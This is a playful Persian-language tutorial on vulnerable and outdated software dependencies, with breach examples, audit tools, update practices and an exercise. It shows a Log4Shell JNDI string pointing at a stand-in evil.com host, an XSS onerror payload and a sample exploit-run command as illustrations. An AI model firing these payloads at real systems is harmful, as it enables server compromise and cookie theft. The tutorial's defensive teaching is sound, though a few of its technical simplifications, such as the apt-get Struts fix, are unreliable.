# 📦🦕 آسیب‌پذیری شماره ۶: کامپوننت‌های آسیب‌پذیر و قدیمی (Vulnerable and Outdated Components)

## 🤔 این چیه به زبان ساده؟

تصور کن یه خونه خیلی قشنگ و مدرن داری ولی... در ورودیش قفل قدیمی داره که با یه سیم هم میشه بازش کرد! 🚪🔓

یا این که ماشین مدل ۲۰۲۴ داری ولی لاستیک‌هاش از سال ۱۹۹۰ هستن و تُرک خوردن! 🚗💨

همین اتفاق وقتی می‌افته که از کتابخونه‌های قدیمی و آسیب‌پذیر توی پروژه‌ت استفاده می‌کنی!

## 🎮 مثال بامزه: پروژه با کتابخونه دایناسوری 🦖

```json
// package.json
{
    "name": "my-awesome-app",
    "version": "1.0.0",
    "dependencies": {
        "express": "3.0.0",      // 😱 سال ۲۰۱۲!
        "mongoose": "2.7.0",      // 😱 سال ۲۰۱۲!
        "lodash": "3.10.1",       // 😱 سال ۲۰۱۵!
        "jquery": "1.8.0"         // 😱 سال ۲۰۱۲!
    }
}
```

حالا نگاه کن چه آسیب‌پذیری‌هایی داره:

```bash
npm audit

found 47 vulnerabilities (12 low, 15 moderate, 18 high, 2 critical)

Critical Issues:
- lodash: Prototype Pollution (CVE-2019-10744)
- express: Path Traversal (CVE-2014-6394)
```

یعنی چی؟ یعنی **۴۷ تا در باز داری که هکرا می‌تونن بیان تو!** 🚨

## 🎪 مثال‌های واقعی ترسناک

### مثال ۱: Equifax (۲۰۱۷) 💀

Equifax یه شرکت بزرگ بود که اطلاعات اعتباری مردم رو نگه می‌داشت.

```
مشکل: Apache Struts نسخه قدیمی داشتن
آسیب‌پذیری: CVE-2017-5638
وصله امنیتی: ۲ ماه قبل منتشر شده بود!
نتیجه: اطلاعات 147 میلیون نفر لو رفت! 😱💔
```

فقط باید یه کامند اجرا می‌کردن:
```bash
apt-get update
apt-get upgrade apache-struts
```

**ولی نکردن!** 🤦

### مثال ۲: Log4Shell (۲۰۲۱) ☕💥

یکی از بزرگترین آسیب‌پذیری‌های تاریخ!

```java
// کتابخونه Log4j (خیلی محبوب)
logger.info("User logged in: " + username);

// هکر اسمش رو می‌نویسه:
${jndi:ldap://evil.com/exploit}

// و کل سرور هک میشه! 😱
```

میلیون‌ها سرور توی دنیا آسیب‌پذیر بودن! Minecraft، Apple، Amazon، و...

### مثال ۳: jQuery XSS (۲۰۱۵) 🕷️

```javascript
// jQuery نسخه قدیمی (قبل از 3.0.0)
$('div').html(userInput);

// هکر می‌نویسه:
<img src=x onerror="alert('Hacked!')">

// و کد JavaScript اجرا میشه! 💀
```

## 🎯 چرا خطرناکه؟

### ۱. همه باگ‌ها رو می‌دونن! 📢

```bash
# وقتی یه آسیب‌پذیری پیدا میشه:
# ۱. تو سایت‌های امنیتی منتشر میشه
# ۲. تو GitHub exploit کامل گذاشته میشه!
# ۳. ابزارهای خودکار هک ساخته میشه!

# مثال: یه هکر ۱۲ ساله هم می‌تونه:
git clone https://github.com/exploit/log4shell
python exploit.py --target yoursite.com
# و هک کنه! 😱
```

### ۲. پنهانن! 🙈

```bash
# تو پروژه خودت فقط این رو می‌بینی:
npm install express

# ولی express وابستگی به ۳۰ تا کتابخونه دیگه داره!
express
  ├── body-parser
  │   ├── iconv-lite
  │   │   └── safer-buffer  # این رو نمی‌دونستی داری!
  │   └── qs
  ├── cookie
  └── ...

# اگه یکیش آسیب‌پذیر باشه، تو هم آسیب‌پذیری! 🕸️
```

### ۳. فراموش میشن! 🧠

```javascript
// یه روز نصب کردی:
npm install some-old-package

// ۲ سال بعد:
// تو: "این پکیج چیه؟ چرا اینجاست؟ 🤔"
// (ولی هنوز داره استفاده میشه!)
```

## 🛡️ چطور درستش کنیم؟

### ۱. همیشه چک کن چی داری! 👀

```bash
# Node.js
npm audit

# نتیجه:
found 15 vulnerabilities (7 moderate, 8 high)

run `npm audit fix` to fix them

# Python
pip check

# Ruby
bundle audit

# Java
mvn dependency-check:check
```

### ۲. آپدیت منظم! 🔄

```bash
# Node.js - بروزرسانی همه چی
npm update

# یا با ابزار بهتر:
npm install -g npm-check-updates
ncu -u  # چک می‌کنه آپدیت جدید هست؟
npm install

# Python
pip install --upgrade package-name

# یا همه:
pip list --outdated
```

### ۳. از ابزارهای خودکار استفاده کن 🤖

```yaml
# GitHub Dependabot
# فایل: .github/dependabot.yml

version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    # هر هفته چک می‌کنه و PR می‌زنه! 🎉
```

```bash
# یا Snyk
npm install -g snyk
snyk test  # چک می‌کنه آسیب‌پذیری داری؟
snyk wizard  # کمکت می‌کنه درستش کنی
```

### ۴. فقط چیزایی که لازمه رو نصب کن! 📦

```bash
# ❌ بد - هر چی دیدی نصب می‌کنی!
npm install left-pad
npm install is-even
npm install is-odd
npm install is-number
# برای یه کار ساده ۱۰۰ تا پکیج! 😱

# ✅ خوب - فکر کن واقعا لازمه؟
# شاید بشه خودت بنویسیش؟

// بجای:
const leftPad = require('left-pad');
leftPad('hello', 10);

// خودت بنویس:
const leftPad = (str, len) => str.padStart(len);
// همین! 🎉
```

### ۵. نسخه‌ها رو قفل کن! 🔒

```json
// ❌ بد - نسخه شناور
{
    "dependencies": {
        "express": "^4.17.1"  // ^ یعنی هر نسخه 4.x.x
        // ممکنه فردا 4.99.0 نصب بشه و باگ داشته باشه!
    }
}

// ✅ بهتر - نسخه دقیق
{
    "dependencies": {
        "express": "4.17.1"  // دقیقا این نسخه
    }
}

// ✅ عالی - با lock file
# package-lock.json
# yarn.lock
# این فایل‌ها نسخه دقیق همه چیز رو ذخیره می‌کنن
```

### ۶. قبل از استفاده، تحقیق کن! 🔍

```bash
# قبل از npm install، چک کن:

# ۱. چندتا دانلود داره؟
# ۲. کی آخرین آپدیت بوده؟
# ۳. چندتا Issue باز داره؟
# ۴. آیا فعال نگهداری میشه؟
# ۵. چندتا Contributor داره؟

# مثال بد:
Package: super-cool-lib
Downloads: 23/week
Last update: 4 years ago
Issues: 156 open
# این رو نصب نکن! 🚫

# مثال خوب:
Package: express
Downloads: 20,000,000/week
Last update: 2 weeks ago
Issues: 45 open (از 2000!)
Contributors: 300+
# این خوبه! ✅
```

## 🎯 چک‌لیست امنیتی

- ✅ هر ماه `npm audit` یا `pip check` اجرا کن
- ✅ Dependabot یا Snyk رو فعال کن
- ✅ قبل از نصب، پکیج رو تحقیق کن
- ✅ پکیج‌های غیرضروری رو حذف کن
- ✅ از lock file استفاده کن
- ✅ در CI/CD امنیت رو چک کن
- ✅ کتابخونه‌های قدیمی رو آپدیت کن
- ✅ از CDN های معتبر استفاده کن (برای فرانت‌اند)

## 🎓 تمرین: پیدا کن و درست کن!

این package.json رو ببین:

```json
{
    "dependencies": {
        "express": "3.0.0",
        "lodash": "4.17.4",
        "moment": "2.19.3",
        "request": "2.88.0"
    }
}
```

<details>
<summary>جواب</summary>

**مشکلات:**

1. **express 3.0.0** - خیلی قدیمیه! (۲۰۱۲)
   - آپدیت کن به: `"express": "^4.18.0"`

2. **lodash 4.17.4** - آسیب‌پذیری Prototype Pollution داره
   - آپدیت کن به: `"lodash": "^4.17.21"`

3. **moment** - دیگه نگهداری نمیشه! (deprecated)
   - جایگزین کن با: `"dayjs": "^1.11.0"` یا `"date-fns": "^2.29.0"`

4. **request** - دیگه نگهداری نمیشه! (deprecated)
   - جایگزین کن با: `"axios": "^1.0.0"` یا `"node-fetch": "^3.0.0"`

**نسخه درست:**
```json
{
    "dependencies": {
        "express": "^4.18.2",
        "lodash": "^4.17.21",
        "dayjs": "^1.11.7",
        "axios": "^1.3.4"
    }
}
```

بعد:
```bash
npm install
npm audit
npm audit fix
```

</details>

## 🎬 داستان الهام‌بخش

یه استارتاپ کوچیک بود که محصولشون داشت محبوب میشد. یه روز یه هکر کلاه‌سفید بهشون ایمیل زد:

> "سلام! سایتتون از نسخه خیلی قدیمی jQuery استفاده می‌کنه که ۱۵ تا آسیب‌پذیری شناخته‌شده داره. ضمیمه این ایمیل، لیست همه‌شونه. لطفا سریع آپدیت کنید! 🙏"

تیم فنی فکر کردن: "آخه jQuery که فقط برای یه انیمیشن ساده استفاده می‌کنیم!"

ولی بعد فهمیدن jQuery روی **همه صفحات** لود میشه و یه هکر می‌تونه از طریقش XSS انجام بده و کوکی‌های کاربرا رو بدزده!

سریع آپدیت کردن و از اون هکر کلاه‌سفید تشکر کردن! 💚

**درس:** حتی یه کتابخونه کوچیک هم می‌تونه خطرناک باشه!

## 📚 ابزارهای مفید

**برای Node.js:**
- `npm audit` - داخلی npm
- [Snyk](https://snyk.io/) - بررسی امنیت
- [Dependabot](https://github.com/dependabot) - آپدیت خودکار
- `npm-check-updates` - چک کردن آپدیت‌ها

**برای Python:**
- `safety check` - بررسی امنیت
- `pip-audit` - ابزار audit

**برای Java:**
- OWASP Dependency-Check
- Snyk

**وب‌سایت‌های مفید:**
- [CVE Details](https://www.cvedetails.com/)
- [Snyk Vulnerability Database](https://security.snyk.io/)
- [NPM Security Advisories](https://www.npmjs.com/advisories)

## 🎨 اتوماسیون تو CI/CD

```yaml
# GitHub Actions
name: Security Check

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run npm audit
        run: |
          npm ci
          npm audit --audit-level=moderate

      - name: Run Snyk
        run: |
          npm install -g snyk
          snyk test
```

---

**یادت باشه: خونه‌ات رو با قفل قدیمی قفل نکن! کتابخونه‌هات رو آپدیت نگه دار! 🔄✨**

**"کد قدیمی = باگ جدید!" 🦕💥**
